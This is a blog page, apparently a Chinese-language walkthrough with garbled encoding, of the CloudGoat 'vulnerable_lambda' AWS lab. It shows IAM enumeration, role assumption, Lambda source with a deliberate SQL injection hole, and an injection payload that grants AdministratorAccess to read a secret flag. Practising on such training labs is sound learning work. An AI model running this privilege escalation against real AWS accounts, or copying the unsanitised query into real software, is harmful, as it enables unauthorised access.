<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CloudGoat (â˜ï¸ğŸ)é¶åœºåˆä½“éªŒ | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="CloudGoat (â˜ï¸ğŸ)é¶åœºåˆä½“éªŒ | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="ä¸€ä¸ªå¼€æºçš„äº‘é¶åœºï¼šhttps://github.com/RhinoSecurityLabs/cloudgoat/
ä½“éªŒé¡ºä¾¿å­¦ä¹ ä¸€ä¸‹ğŸ“–
å®‰è£… &amp; é…ç½®
å®‰è£…å‰ç¡®ä¿æœºå™¨ï¼š

Linux or MacOS. Windows is not..." />
    <meta name="keywords" content="CloudGoat,äº‘å®‰å…¨,AWS" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              CloudGoat (â˜ï¸ğŸ)é¶åœºåˆä½“éªŒ
            </h2>
            <div class="post-info">
              <span>
                2024-07-09
              </span>
              <span>
                8 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/udTQ5jCzp/" class="post-tag">
                  # CloudGoat
                </a>
              
                <a href="https://skyblu3519.github.io/tag/8Ilrlif21/" class="post-tag">
                  # äº‘å®‰å…¨
                </a>
              
                <a href="https://skyblu3519.github.io/tag/su2_uaPzNg/" class="post-tag">
                  # AWS
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/cloudgoat-ba-chang-chu-ti-yan.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <p>ä¸€ä¸ªå¼€æºçš„äº‘é¶åœºï¼š<a href="https://github.com/RhinoSecurityLabs/cloudgoat/">https://github.com/RhinoSecurityLabs/cloudgoat/</a></p>
<p>ä½“éªŒé¡ºä¾¿å­¦ä¹ ä¸€ä¸‹ğŸ“–</p>
<h1 id="å®‰è£…-é…ç½®">å®‰è£… &amp; é…ç½®</h1>
<p>å®‰è£…å‰ç¡®ä¿æœºå™¨ï¼š</p>
<ul>
<li>Linux or MacOS. Windows is not officially supported.
<ul>
<li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</li>
</ul>
</li>
<li>Python3.6+ is required.</li>
<li>Terraform &gt;= 0.14 installed and in your $PATH.</li>
<li>The AWS CLI installed and in your $PATH, and an AWS account with sufficient privileges to create and destroy resources.</li>
<li>jq</li>
</ul>
<p>å®‰è£…æµç¨‹</p>
<pre><code>git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r ./requirements.txt
chmod +x cloudgoat.py
</code></pre>
<p>ç„¶åæ˜¯ä¸¤æ­¥åˆå§‹åŒ–</p>
<pre><code>./cloudgoat.py config profile
./cloudgoat.py config whitelist --auto
</code></pre>
<p>cloudgoatä¼šä½¿ç”¨æœ¬æœºä¸Š AWS CLI çš„é…ç½®ã€‚ç¼–è¾‘é…ç½®æ–‡ä»¶<code>~/.aws/credentials</code>ï¼Œæ·»åŠ cloudgoatæ‰€ç”¨çš„AWSè´¦æˆ·çš„æ–‡ä»¶æ®µ<code>[skyblu3]</code><br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720531972702-e43360e6-83e6-4a6b-b4a6-0b14500a8344.png" alt="image.png" loading="lazy"></p>
<p><code>./cloudgoat.py config profile</code>è¾“å…¥<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532044190-560aac93-f9fe-46db-8329-92fd9f87c691.png" alt="image.png" loading="lazy"></p>
<p>ç¬¬äºŒæ­¥æ˜¯é…ç½®äº‘ä¸Šå¯ä»¥éƒ¨ç½²çš„IPåˆ—è¡¨ï¼Œäº‘ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿çš„è¯å°±ç›´æ¥<code>--auto</code>è‡ªåŠ¨ç”Ÿæˆ</p>
<h1 id="é¶åœºåˆä½“éªŒ">é¶åœºåˆä½“éªŒ</h1>
<h2 id="é¶åœºæ­å»º">é¶åœºæ­å»º</h2>
<p>cloudgoatä¸­æœ‰17ä¸ªé¶åœºï¼Œåœ¨Githubé¡µé¢çš„<strong>Scenarios Available</strong>éƒ¨åˆ†å¯ä»¥å¯¼èˆªåˆ°æ¯ä¸ªé¶åœºçš„è¯¦æƒ…é¡µé¢ã€‚ç‚¹å‡»ç¬¬ä¸€ä¸ª<code>vulnerable_lambda</code>é¶åœºã€‚<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532249577-646b0f77-425c-4142-a050-a0029ba124e0.png" alt="image.png" loading="lazy"></p>
<p>é¶åœºçš„æ–‡æ¡£ä¸­åŒ…å«å¯åŠ¨çš„å‘½ä»¤ã€èµ„æºåˆ—è¡¨å’Œæ”»å‡»è·¯å¾„ï¼Œåœ¨æ—è¾¹çš„ç›®å½•åˆ—è¡¨ä¹Ÿå¯ä»¥çœ‹åˆ°ç”Ÿæˆè¯¥é¶åœºçš„tfä»£ç <br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532539521-b22352e2-075b-41bc-b628-66c20f5f2102.png" alt="image.png" loading="lazy"></p>
<p>æ¥ä¸‹æ¥å¯åŠ¨è¿™ä¸ªé¶åœº</p>
<pre><code>./cloudgoat.py create vulnerable_lambda
</code></pre>
<p>ç”ŸæˆæˆåŠŸåæ‹¿åˆ°è¿™ä¸ªé¶åœºçš„åˆå§‹è®¿é—®ç”¨æˆ·<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532685265-09d28116-ed86-4da8-9bd7-759704ae4806.png" alt="image.png" loading="lazy"></p>
<p>ç°åœ¨å°±å¯ä»¥å¼€å§‹æ¸—é€äº†</p>
<h2 id="æ¸—é€å¼€å§‹">æ¸—é€å¼€å§‹</h2>
<p>é¦–å…ˆçœ‹ä¸‹è¿™ä¸ªé¶åœºçš„æ€»ç»“</p>
<blockquote>
<p>åœ¨æ­¤åœºæ™¯ä¸­ï¼Œæ‚¨ä»¥â€œbilboâ€ç”¨æˆ·èº«ä»½å¼€å§‹ã€‚æ‚¨å°†æ‰®æ¼”ä¸€ä¸ªå…·æœ‰æ›´å¤šæƒé™çš„è§’è‰²ï¼Œå‘ç°ä¸€ä¸ªå°†ç­–ç•¥åº”ç”¨äºç”¨æˆ·çš„ lambda å‡½æ•°ï¼Œå¹¶åˆ©ç”¨è¯¥å‡½æ•°ä¸­çš„æ¼æ´æ¥æå‡ bilbo ç”¨æˆ·çš„æƒé™ä»¥æœç´¢ç§˜å¯†ã€‚</p>
</blockquote>
<p>ç”¨æä¾›çš„å‡­è¯ç™»å½•bilboç”¨æˆ·<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720532908694-31fd1c96-9a36-4d2e-8bc3-118c27abdbd7.png" alt="image.png" loading="lazy"></p>
<p>ç­–ç•¥æŒ–æ˜ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„å†…è”ç­–ç•¥</p>
<pre><code class="language-json">aws iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720533601842-06de227d-bf47-4655-bf41-b335f6cea1c1.png" alt="image.png" loading="lazy"></figure>
<p>æŸ¥çœ‹ç­–ç•¥å…·ä½“å†…å®¹</p>
<pre><code class="language-json">aws iam get-user-policy --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463 --policy-name cg-bilbo-vulnerable_lambda_cgidi6d2661463-standard-user-assumer
{
    &quot;UserName&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463&quot;,
    &quot;PolicyName&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463-standard-user-assumer&quot;,
    &quot;PolicyDocument&quot;: {
        &quot;Version&quot;: &quot;2012-10-17&quot;,
        &quot;Statement&quot;: [
            {
                &quot;Action&quot;: &quot;sts:AssumeRole&quot;,
                &quot;Effect&quot;: &quot;Allow&quot;,
                &quot;Resource&quot;: &quot;arn:aws:iam::940877411605:role/cg-lambda-invoker*&quot;,
                &quot;Sid&quot;: &quot;&quot;
            },
            {
                &quot;Action&quot;: [
                    &quot;iam:Get*&quot;,
                    &quot;iam:List*&quot;,
                    &quot;iam:SimulateCustomPolicy&quot;,
                    &quot;iam:SimulatePrincipalPolicy&quot;
                ],
                &quot;Effect&quot;: &quot;Allow&quot;,
                &quot;Resource&quot;: &quot;*&quot;,
                &quot;Sid&quot;: &quot;&quot;
            }
        ]
    }
}

</code></pre>
<p>å¯ä»¥çœ‹åˆ°è¯¥ç”¨æˆ·å¯¹IAMä¸‹çš„æ‰€æœ‰èµ„æºéƒ½æœ‰List/Getæƒé™ï¼åŒæ—¶ä»–è¿˜å¯ä»¥æ‰®æ¼”ä¸€ä¸ª<code>cg-lambda-invoker</code>è§’è‰²ã€‚åˆ—å‡ºæ‰€æœ‰IAMè§’è‰²</p>
<pre><code class="language-json">aws iam list-roles --query &quot;Roles[*].RoleName&quot;
[
    &quot;AWSServiceRoleForRDS&quot;,
    &quot;AWSServiceRoleForResourceExplorer&quot;,
    &quot;AWSServiceRoleForSupport&quot;,
    &quot;AWSServiceRoleForTrustedAdvisor&quot;,
    &quot;cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463&quot;,
    &quot;vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1&quot;
]
</code></pre>
<p><code>cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463</code>åº”è¯¥å°±æ˜¯ä¸‹ä¸€æ­¥è¦æ‰®æ¼”çš„è§’è‰²äº†ã€‚ä¸è¿‡åœ¨assumeä¹‹å‰ï¼Œå…ˆçœ‹ä¸‹è¯¥è§’è‰²çš„ç­–ç•¥ã€‚å¦å¤–æˆ‘å¯¹<code>vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1</code>è¿™ä¸ªè§’è‰²ä¹ŸæŒºæ„Ÿå…´è¶£çš„ï¼ˆæ¯•ç«Ÿæˆ‘ä»¬æœ‰iam:List*/iam:Get*ï¼‰ã€‚</p>
<p>é¦–å…ˆçœ‹ä¸‹<code>vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1</code>ï¼Œè¿™ä¼¼ä¹æ˜¯cloudgoatç”¨æ¥ç»™é¶åœºä¸­çš„ç”¨æˆ·èµ‹æƒçš„ï¼ŒåŒæ—¶å®ƒè¿˜æœ‰ä¸€ä¸ªæ¨é€æ—¥å¿—çš„æƒé™ï¼Œä¼¼ä¹æ˜¯ç»™CloudTrailä½¿ç”¨çš„ã€‚</p>
<pre><code class="language-json">aws iam list-role-policies --role-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1
aws iam get-role-policy --role-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1 --policy-name policy_applier_lambda1
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720535122702-94b7bdfc-2239-4a6a-af81-9877a879e37b.png" alt="image.png" loading="lazy"></figure>
<p>ç„¶åæ˜¯<code>cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463</code>ï¼Œå®ƒåŒ…å«å¯¹ä¸€ä¸ªLambdaçš„å¤§éƒ¨åˆ†æ“ä½œ</p>
<pre><code class="language-json">aws iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463
aws iam get-role-policy --role-name cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463 --policy-name lambda-invoker
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720535862712-fbdcfc6b-3041-4cbb-8ae2-44836e3869f4.png" alt="image.png" loading="lazy"></figure>
<p>ç°åœ¨Assumeè¿™ä¸ªRole</p>
<pre><code class="language-json">aws sts assume-role --role-arn arn:aws:iam::637423561540:role/cg-lambda-invoker-vulnerable_lambda_cgidi6d2661463 --role-session-name lambda_invoker
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720536339676-894b1f20-1618-4bbc-9efe-104fe9c89140.png" alt="image.png" loading="lazy"></figure>
<p>æŸ¥çœ‹functionçš„ä¿¡æ¯ï¼Œåœ¨<code>Code.Location</code>ä½ç½®æ‰¾åˆ°å‡½æ•°æºç çš„ä¸‹è½½é“¾æ¥</p>
<pre><code class="language-json">aws lambda get-function --function-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720537386567-091a4ddc-6240-4d72-845f-5c0616875403.png" alt="image.png" loading="lazy"></figure>
<p>è§£å‹æºç zip<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720537490379-c0cde3bb-f491-4cb1-a2d5-424a8cdca522.png" alt="image.png" loading="lazy"></p>
<p>æ‰“å¼€main.py</p>
<pre><code class="language-python">import boto3
from sqlite_utils import Database

db = Database(&quot;my_database.db&quot;)
iam_client = boto3.client('iam')


# db[&quot;policies&quot;].insert_all([
#     {&quot;policy_name&quot;: &quot;AmazonSNSReadOnlyAccess&quot;, &quot;public&quot;: 'True'}, 
#     {&quot;policy_name&quot;: &quot;AmazonRDSReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AWSLambda_ReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AmazonS3ReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AmazonGlacierReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AmazonRoute53DomainsReadOnlyAccess&quot;, &quot;public&quot;: 'True'},
#     {&quot;policy_name&quot;: &quot;AdministratorAccess&quot;, &quot;public&quot;: 'False'}
# ])


def handler(event, context):
    target_policys = event['policy_names']
    user_name = event['user_name']
    print(f&quot;target policys are : {target_policys}&quot;)

    for policy in target_policys:
        statement_returns_valid_policy = False
        statement = f&quot;select policy_name from policies where policy_name='{policy}' and public='True'&quot;
        for row in db.query(statement):
            statement_returns_valid_policy = True
            print(f&quot;applying {row['policy_name']} to {user_name}&quot;)
            response = iam_client.attach_user_policy(
                UserName=user_name,
                PolicyArn=f&quot;arn:aws:iam::aws:policy/{row['policy_name']}&quot;
            )
            print(&quot;result: &quot; + str(response['ResponseMetadata']['HTTPStatusCode']))

        if not statement_returns_valid_policy:
            invalid_policy_statement = f&quot;{policy} is not an approved policy, please only choose from approved &quot; \
                                       f&quot;policies and don't cheat. :) &quot;
            print(invalid_policy_statement)
            return invalid_policy_statement

    return &quot;All managed policies were applied as expected.&quot;


if __name__ == &quot;__main__&quot;:
    payload = {
        &quot;policy_names&quot;: [
            &quot;AmazonSNSReadOnlyAccess&quot;,
            &quot;AWSLambda_ReadOnlyAccess&quot;
        ],
        &quot;user_name&quot;: &quot;cg-bilbo-user&quot;
    }
    print(handler(payload, 'uselessinfo'))
</code></pre>
<p>è¿™ä¸ªå‡½æ•°å¯ä»¥ç»™ä¸€ä¸ªIAMç”¨æˆ·èµ‹æƒï¼Œå¯ç”¨çš„æƒé™å°±æ˜¯<code>my_database.db</code>ä¸­<code>public</code>å€¼ä¸ºTrueçš„å‡ ä¸ª</p>
<pre><code class="language-python">AmazonSNSReadOnlyAccess
AmazonRDSReadOnlyAccess
AWSLambda_ReadOnlyAccess
AmazonS3ReadOnlyAccess
AmazonGlacierReadOnlyAccess
AmazonRoute53DomainsReadOnlyAccess
</code></pre>
<p>ä½†æ˜¯ç”¨äºåˆ¤æ–­æƒé™æ˜¯å¦ç¬¦åˆè¦æ±‚çš„SQLè¯­å¥<code>statement</code>æ²¡æœ‰å¯¹è¾“å…¥è¿›è¡Œæ£€æŸ¥ï¼Œè€Œåé¢ç”¨æ¥èµ‹æƒçš„<code>attach_user_policy</code>å‡½æ•°ç”¨çš„ç¡®å®æŸ¥è¯¢å‡ºæ¥çš„<code>row['policy_name']</code>ã€‚é‚£æˆ‘ä»¬å¯ä»¥è¾“å…¥<code>AdministratorAccess'-- </code>ï¼ˆä½¿ç”¨sqliteçš„æ³¨é‡Šï¼‰è¿›è¡Œæ³¨å…¥ï¼Œç»™ç”¨æˆ·èµ‹äºˆä¸€ä¸ªAWSæ‰˜ç®¡æƒé™<code>arn:aws:iam::aws:policy/AdministratorAccess</code>ã€‚è¿™ä¸ªæƒé™æ˜¯AWSçš„æœ€é«˜æƒé™ï¼Œå¯ä»¥å¯¹äº‘ä¸Šçš„æ‰€æœ‰èµ„æºè¿›è¡Œè®¿é—®ã€‚</p>
<pre><code class="language-python">statement = f&quot;select policy_name from policies where policy_name='{policy}' and public='True'&quot;
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720538139669-6c39b270-7c23-4811-a2d2-267749d63b7b.png" alt="image.png" loading="lazy"></figure>
<p>ç¼–å†™payload.json</p>
<pre><code class="language-json">{
    &quot;policy_names&quot;: [
        &quot;AdministratorAccess'-- &quot;
    ],
    &quot;user_name&quot;: &quot;cg-bilbo-vulnerable_lambda_cgidi6d2661463&quot;
}
</code></pre>
<p>è°ƒç”¨å‡½æ•°æƒé™å·²è¢«è®¾ç½®</p>
<pre><code>aws lambda invoke --function-name vulnerable_lambda_cgidi6d2661463-policy_applier_lambda1 --payload file://payload.json output &amp;&amp; cat output
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539024560-d4e1f5fd-4f80-4479-a373-308f844c8c8f.png" alt="image.png" loading="lazy"></figure>
<p>åˆ‡æ¢å›åŸæ¥çš„ç”¨æˆ·ï¼Œ<code>aws configure set aws_session_token &quot;&quot;</code>æ¸…ç©ºsession tokenã€‚æŸ¥çœ‹ç”¨æˆ·çš„æ‰˜ç®¡ç­–ç•¥ï¼ŒAdministratorAccesså·²è¢«æˆåŠŸèµ‹äºˆ</p>
<pre><code class="language-json">aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidi6d2661463
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539655707-f3c0841b-8fec-4171-b979-b5168a8aa0d6.png" alt="image.png" loading="lazy"></figure>
<p>ç°åœ¨æˆ‘ä»¬å·²ç»å¯ä»¥è®¿é—®äº‘ä¸Šçš„æ‰€æœ‰èµ„æºäº†ï¼åˆ—å‡ºsecret</p>
<pre><code class="language-json">aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539817522-083c2421-a5df-444c-8bf3-ec4df24d80db.png" alt="image.png" loading="lazy"></figure>
<p>è¯»å–flag</p>
<pre><code class="language-json">aws secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidi6d2661463-final_flag  
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720539914753-30611895-5b0e-4bbb-9c6d-318a7dae21f1.png" alt="image.png" loading="lazy"></figure>
<h2 id="æ”»å‡»è·¯å¾„">æ”»å‡»è·¯å¾„</h2>
<p>å†çœ‹ä¸‹é¶åœºç»™çš„æ”»å‡»è·¯å¾„ï¼Œå’Œæˆ‘ä»¬çš„æµç¨‹å‡ ä¹ä¸€æ ·ã€‚è¿˜æ˜¯æŒºç®€å•çš„ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540014904-a6bb6af5-fc6d-4230-b1b3-2997a19b9d90.png" alt="image.png" loading="lazy"></p>
<h1 id="è§£è¯­">è§£è¯­</h1>
<p>æœ€åç®€å•æµè§ˆä¸‹å®ƒçš„tfç›®å½•ç»“æ„ï¼Œè¿™é‡Œäº‘ä¸Šæ¯ä¸ªç±»å‹çš„èµ„æºéƒ½ç”¨äº†å•ç‹¬çš„æ–‡ä»¶å†™ã€‚å…¶ä»–çš„å°±æ˜¯ä¸€äº›å¿…è¦æ•°æ®æºå’Œå˜é‡è¾“å…¥è¾“å‡ºã€‚<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540350475-60b6dca5-dc7b-4369-a622-222542387101.png" alt="image.png" loading="lazy"></p>
<p>å®éªŒç»“æŸï¼Œè¾“å…¥<code>./cloudgoat.py destroy vulnerable_lambda</code>æ¸…ç©ºèµ„æºä»¥å…äº§ç”Ÿé¢å¤–çš„è®¡è´¹<br>
<img src="https://skyblu3519.github.io/post-images/cloudgoat1/1720540459689-ef7190f7-edd2-4029-b07c-1bf3ee270b71.png" alt="image.png" loading="lazy"></p>
<p>ç”»é¥¼ï¼šå­¦ä¹ è¿™ä¸ªé¡¹ç›®çš„ä»£ç æµç¨‹ï¼Œé‡ç‚¹æ˜¯tfä»£ç çš„ç¼–å†™</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E5%AE%89%E8%A3%85-%E9%85%8D%E7%BD%AE">å®‰è£… &amp; é…ç½®</a></li>
<li><a href="#%E9%9D%B6%E5%9C%BA%E5%88%9D%E4%BD%93%E9%AA%8C">é¶åœºåˆä½“éªŒ</a>
<ul>
<li><a href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA">é¶åœºæ­å»º</a></li>
<li><a href="#%E6%B8%97%E9%80%8F%E5%BC%80%E5%A7%8B">æ¸—é€å¼€å§‹</a></li>
<li><a href="#%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84">æ”»å‡»è·¯å¾„</a></li>
</ul>
</li>
<li><a href="#%E8%A7%A3%E8%AF%AD">è§£è¯­</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/zai-aws-shang-shi-yong-you-er-yong-hu-bu-huo-gong-ji-zhe/">
              <h3 class="post-title">
                åœ¨AWSä¸Šä½¿ç”¨è¯±é¥µç”¨æˆ·æ•è·æ”»å‡»è€…
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
